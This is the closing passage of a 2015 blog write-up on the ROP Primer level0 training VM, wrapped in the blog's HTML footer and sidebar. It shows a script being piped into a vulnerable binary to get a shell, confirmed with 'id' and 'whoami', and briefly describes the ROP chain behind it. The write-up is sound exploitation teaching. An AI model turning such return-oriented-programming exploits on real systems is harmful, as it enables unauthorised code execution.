+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="o">(</span>python purepoc0.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./level0
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...&lt;snipped&gt;
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>seb<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>seb<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>seb<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,103<span class="o">(</span>fuse<span class="o">)</span>,104<span class="o">(</span>scanner<span class="o">)</span>,107<span class="o">(</span>bluetooth<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,119<span class="o">(</span>kismet<span class="o">)</span>,900<span class="o">(</span>cbnetwork<span class="o">)</span>
+</span><span class='line'>whoami
+</span><span class='line'>seb
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That was about it. The ROP chain is able to set all the required registers, write out a string in memory and finally perform a syscall.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-06-28T19:45:38+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:45 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/level0/'>level0</a>, <a class='category' href='/blog/categories/rop/'>rop</a>, <a class='category' href='/blog/categories/vm/'>vm</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/05/29/legitbs-ctf-r0pbaby/" title="Previous Post: LegitBS CTF - r0pbaby">&laquo; LegitBS CTF - r0pbaby</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/06/28/rop-primer-level0/">ROP Primer - Level0</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/29/legitbs-ctf-r0pbaby/">LegitBS CTF - R0pbaby</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/02/backdoor-ctf-judge/">Backdoor CTF - Judge</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/02/backdoor-ctf-lhc/">Backdoor CTF - LHC</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/04/02/backdoor-ctf-qr/">Backdoor CTF - QR</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/';
+        var disqus_url = 'http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
